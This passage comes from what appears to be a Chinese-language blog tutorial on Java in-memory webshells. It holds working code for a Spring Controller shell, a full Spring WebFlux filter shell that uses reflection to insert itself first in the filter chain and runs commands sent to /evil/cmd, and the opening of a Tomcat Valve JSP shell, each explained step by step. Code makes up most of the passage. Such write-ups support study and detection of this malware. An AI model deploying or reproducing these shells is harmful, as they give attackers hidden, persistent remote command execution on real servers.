request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118213242404.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118213252847.png"></p><h3 id="4-1-2-Spring-Controller型内存马demo代码分析"><a href="#4-1-2-Spring-Controller型内存马demo代码分析" class="headerlink" title="4.1.2 Spring Controller型内存马demo代码分析"></a>4.1.2 Spring Controller型内存马demo代码分析</h3><p>代码的关键在于如下这几行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> InjectedController.class.getMethod(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="type">PatternsRequestCondition</span> <span class="variable">urlPattern</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(controllerName);</span><br><span class="line"><span class="type">RequestMethodsRequestCondition</span> <span class="variable">condition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line"><span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(urlPattern, condition, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="type">InjectedController</span> <span class="variable">injectedController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InjectedController</span>();</span><br><span class="line">requestMappingHandlerMapping.registerMapping(info, injectedController, method);</span><br></pre></td></tr></table></figure><p>这段代码先利用<code>RequestContextHolder</code>获取当前请求的<code>WebApplicationContext</code>，这个<code>RequestContextHolder</code>是<code>Spring</code>框架提供的用于存储和访问请求相关信息的工具类；接着从上一步中获取到的<code>WebApplicationContext</code>中获取<code>RequestMappingHandlerMapping Bean</code>；接着通过反射获得我们自定义<code>Controller</code>的恶意方法的<code>Method</code>对象，然后就是拿到对应的<code>RequestMappingInfo</code>对象；通过<code>bean</code>实例+处理请求的<code>method</code>+对应的<code>RequestMappinginfo</code>对象即可调用<code>registerMapping</code>方法动态添加恶意<code>controller</code>。</p><h2 id="4-2-Spring-Interceptor型内存马"><a href="#4-2-Spring-Interceptor型内存马" class="headerlink" title="4.2 Spring Interceptor型内存马"></a>4.2 Spring Interceptor型内存马</h2><p>由<code>2.11.2.3</code>节的分析我们很容易得出<code>Spring Interceptor</code>型内存马的编写思路：</p><ul><li>获取<code>ApplicationContext</code></li><li>通过<code>AbstractHandlerMapping</code>反射来获取<code>adaptedInterceptors</code></li><li>将要注入的恶意拦截器放入到<code>adaptedInterceptors</code>中</li></ul><p>具体代码我会放到针对实际中间件打内存马那里。</p><h2 id="4-3-Spring-WebFlux内存马"><a href="#4-3-Spring-WebFlux内存马" class="headerlink" title="4.3 Spring WebFlux内存马"></a>4.3 Spring WebFlux内存马</h2><h3 id="4-3-1-简单的Spring-WebFlux内存马demo编写"><a href="#4-3-1-简单的Spring-WebFlux内存马demo编写" class="headerlink" title="4.3.1 简单的Spring WebFlux内存马demo编写"></a>4.3.1 简单的Spring WebFlux内存马demo编写</h3><p>由<code>2.12.5</code>节的分析我们可以写出下面的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.webfluxmemoryshelldemo.memoryshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.embedded.netty.NettyWebServer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.buffer.DataBuffer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.buffer.DefaultDataBufferFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.WebHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.adapter.HttpWebHandlerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.DefaultWebFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.ExceptionHandlingWebHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.handler.FilteringWebHandler;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Flux;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemoryShellFilter</span> <span class="keyword">implements</span> <span class="title class_">WebFilter</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doInject</span><span class="params">()</span> &#123;</span><br><span class="line">        Method getThreads;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            getThreads = Thread.class.getDeclaredMethod(<span class="string">&quot;getThreads&quot;</span>);</span><br><span class="line">            getThreads.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">threads</span> <span class="operator">=</span> getThreads.invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Array.getLength(threads); i++) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">thread</span> <span class="operator">=</span> Array.get(threads, i);</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span> &amp;&amp; thread.getClass().getName().contains(<span class="string">&quot;NettyWebServer&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">NettyWebServer</span> <span class="variable">nettyWebServer</span> <span class="operator">=</span> (NettyWebServer) getFieldValue(thread, <span class="string">&quot;this$0&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">ReactorHttpHandlerAdapter</span> <span class="variable">reactorHttpHandlerAdapter</span> <span class="operator">=</span> (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, <span class="string">&quot;handler&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">delayedInitializationHttpHandler</span> <span class="operator">=</span> getFieldValue(reactorHttpHandlerAdapter,<span class="string">&quot;httpHandler&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">HttpWebHandlerAdapter</span> <span class="variable">httpWebHandlerAdapter</span> <span class="operator">=</span> (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,<span class="string">&quot;delegate&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">ExceptionHandlingWebHandler</span> <span class="variable">exceptionHandlingWebHandler</span> <span class="operator">=</span> (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,<span class="string">&quot;delegate&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                    <span class="type">FilteringWebHandler</span> <span class="variable">filteringWebHandler</span> <span class="operator">=</span> (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,<span class="string">&quot;delegate&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                    <span class="type">DefaultWebFilterChain</span> <span class="variable">defaultWebFilterChain</span> <span class="operator">=</span> (DefaultWebFilterChain) getFieldValue(filteringWebHandler,<span class="string">&quot;chain&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getFieldValue(defaultWebFilterChain, <span class="string">&quot;handler&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    List&lt;WebFilter&gt; newAllFilters = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(defaultWebFilterChain.getFilters());</span><br><span class="line">                    newAllFilters.add(<span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">MemoryShellFilter</span>());</span><br><span class="line">                    <span class="type">DefaultWebFilterChain</span> <span class="variable">newChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebFilterChain</span>((WebHandler) handler, newAllFilters);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> filteringWebHandler.getClass().getDeclaredField(<span class="string">&quot;chain&quot;</span>);</span><br><span class="line">                    f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">modifersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">                    modifersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">                    f.set(filteringWebHandler, newChain);</span><br><span class="line">                    modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName,<span class="type">boolean</span> superClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field f;</span><br><span class="line">        <span class="keyword">if</span>(superClass)&#123;</span><br><span class="line">            f = obj.getClass().getSuperclass().getDeclaredField(fieldName);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Flux&lt;DataBuffer&gt; <span class="title function_">getPost</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> request.getURI().getQuery();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path.equals(<span class="string">&quot;/evil/cmd&quot;</span>) &amp;&amp; query != <span class="literal">null</span> &amp;&amp; query.startsWith(<span class="string">&quot;command=&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> query.substring(<span class="number">8</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;cmd /c&quot;</span> + command);</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">                Flux&lt;DataBuffer&gt; response = Flux.create(sink -&gt; &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        String line;</span><br><span class="line">                        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                            sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">                        &#125;</span><br><span class="line">                        sink.complete();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException ignored) &#123;&#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">                exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN);</span><br><span class="line">                <span class="keyword">return</span> response;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ignored) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Flux.empty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, WebFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (exchange.getRequest().getURI().getPath().startsWith(<span class="string">&quot;/evil/&quot;</span>)) &#123;</span><br><span class="line">            doInject();</span><br><span class="line">            Flux&lt;DataBuffer&gt; response = getPost(exchange);</span><br><span class="line">            <span class="type">ServerHttpResponse</span> <span class="variable">serverHttpResponse</span> <span class="operator">=</span> exchange.getResponse();</span><br><span class="line">            serverHttpResponse.getHeaders().setContentType(MediaType.TEXT_PLAIN);</span><br><span class="line">            <span class="keyword">return</span> serverHttpResponse.writeWith(response);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240126191718261.png"></p><h3 id="4-3-2-Spring-WebFlux内存马demo代码分析"><a href="#4-3-2-Spring-WebFlux内存马demo代码分析" class="headerlink" title="4.3.2 Spring WebFlux内存马demo代码分析"></a>4.3.2 Spring WebFlux内存马demo代码分析</h3><p>从之前的分析我们知道，主要思路就是通过反射找到<code>DefaultWebFilterChain</code>，然后拿到<code>filters</code>，把我们的<code>filter</code>插入到其中的第一位，再用这个<code>filters</code>重新调用公共构造函数<code>DefaultWebFilterChain</code>，赋值给之前分析里面我没看到的<code>this.chain</code>即可。</p><p>思路就是这么个思路，我们来看具体的代码。</p><p>先是通过反射来获取当前运行的所有线程组，然后遍历线程数组，检查每个线程是否为<code>NettyWebServer</code>实例。如果发现一个线程是<code>NettyWebServer</code>，那就继续下一步的操作。接下来就是找<code>DefaultWebFilterChain</code>对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">NettyWebServer</span> <span class="variable">nettyWebServer</span> <span class="operator">=</span> (NettyWebServer) getFieldValue(thread, <span class="string">&quot;this$0&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="type">ReactorHttpHandlerAdapter</span> <span class="variable">reactorHttpHandlerAdapter</span> <span class="operator">=</span> (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, <span class="string">&quot;handler&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">delayedInitializationHttpHandler</span> <span class="operator">=</span> getFieldValue(reactorHttpHandlerAdapter,<span class="string">&quot;httpHandler&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="type">HttpWebHandlerAdapter</span> <span class="variable">httpWebHandlerAdapter</span> <span class="operator">=</span> (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler,<span class="string">&quot;delegate&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="type">ExceptionHandlingWebHandler</span> <span class="variable">exceptionHandlingWebHandler</span> <span class="operator">=</span> (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,<span class="string">&quot;delegate&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="type">FilteringWebHandler</span> <span class="variable">filteringWebHandler</span> <span class="operator">=</span> (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,<span class="string">&quot;delegate&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="type">DefaultWebFilterChain</span> <span class="variable">defaultWebFilterChain</span> <span class="operator">=</span> (DefaultWebFilterChain) getFieldValue(filteringWebHandler,<span class="string">&quot;chain&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>这条链子在之前的分析中已经提到过，一步步调用我们写的<code>getFieldValue</code>函数即可。</p><p>然后就是修改这个过滤器链，添加我们自定义的恶意filter，并把它放到第一位：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getFieldValue(defaultWebFilterChain, <span class="string">&quot;handler&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">List&lt;WebFilter&gt; newAllFilters = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(defaultWebFilterChain.getFilters());</span><br><span class="line">newAllFilters.add(<span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">MemoryShellFilter</span>());</span><br><span class="line"><span class="type">DefaultWebFilterChain</span> <span class="variable">newChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebFilterChain</span>((WebHandler) handler, newAllFilters);</span><br></pre></td></tr></table></figure><p>然后通过反射获取<code>FilteringWebHandler</code>的私有字段<code>chain</code>，设置为可访问之后，通过反射将原始的过滤器链替换为新创建的过滤器链<code>newChain</code>，然后恢复字段的可访问权限：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> filteringWebHandler.getClass().getDeclaredField(<span class="string">&quot;chain&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">modifersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">modifersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">f.set(filteringWebHandler, newChain);</span><br><span class="line">modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL);</span><br></pre></td></tr></table></figure><p>这里补充一下上面的<code>modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);</code>和<code>modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL);</code>的含义，第一个代码意思就是使用反射机制，通过<code>modifersField</code>对象来修改字段的修饰符，<code>f.getModifiers()</code>返回字段<code>f</code>的当前修饰符，然后通过位运算<code>&amp; ~Modifier.FINAL</code>，将当前修饰符的<code>FINAL</code>位清除（置为<code>0</code>），表示移除了<code>FINAL</code>修饰符；第二个则是把字段的修饰符重新设置为包含<code>FINAL</code>修饰符的修饰符，这样就可以保持字段的封装性。</p><h1 id="五、中间件型内存马"><a href="#五、中间件型内存马" class="headerlink" title="五、中间件型内存马"></a>五、中间件型内存马</h1><h2 id="5-1-Tomcat-Valve型内存马"><a href="#5-1-Tomcat-Valve型内存马" class="headerlink" title="5.1 Tomcat Valve型内存马"></a>5.1 Tomcat Valve型内存马</h2><p>我这里是新建了一个项目，并创建配置好了<code>web</code>目录和<code>tomcat</code>环境，<code>pom.xml</code>中的依赖如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>如果idea启动tomcat报错，可以看看是不是你开了网易云哈哈哈：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240130181221187.png"></p></blockquote><p>在<code>web</code>目录下新建一个<code>666.jsp</code>：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">pipelineField</span> <span class="operator">=</span> ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipelineField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardPipeline</span> <span class="variable">evilStandardPipeline</span> <span class="operator">=</span> (StandardPipeline) pipelineField.get(standardContext);</span><br><span class="line">    <span class="type">ValveBase</span> <span class="variable">evilValve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValveBase</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> ServletException,IOException &#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> 